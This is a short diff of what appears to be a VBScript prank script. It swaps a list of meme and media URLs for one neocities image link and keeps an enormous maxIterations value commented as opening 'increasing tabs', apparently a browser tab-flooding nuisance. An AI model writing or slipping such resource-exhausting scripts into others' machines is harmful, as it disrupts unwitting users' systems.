@@ -2,16 +2,7 @@ Set objShell = CreateObject("WScript.Shell")
 
 ' Array of direct URLs
 urls = Array( _
-    "https://www.youtube.com/watch?v=dQw4w9WgXcQ", _
-    "https://en.wikipedia.org/wiki/Fish", _
-    "https://skibiditoilet.io", _
-    "https://knowyourmeme.com/memes/sigma-male", _
-    "https://www.bbc.co.uk/programmes/b006t0xg", _
-    "https://reddit.com/r/memes", _
-    "https://x.com/skibiditoilet", _
-    "https://twitch.tv", _
-    "https://soundcloud.com", _
-    "https://open.spotify.com" _
+    "https://coffee-proxy.neocities.org/Png.png" _
 )
 
 maxIterations = 69996969696969696969696996 ' Number of times to open increasing tabs
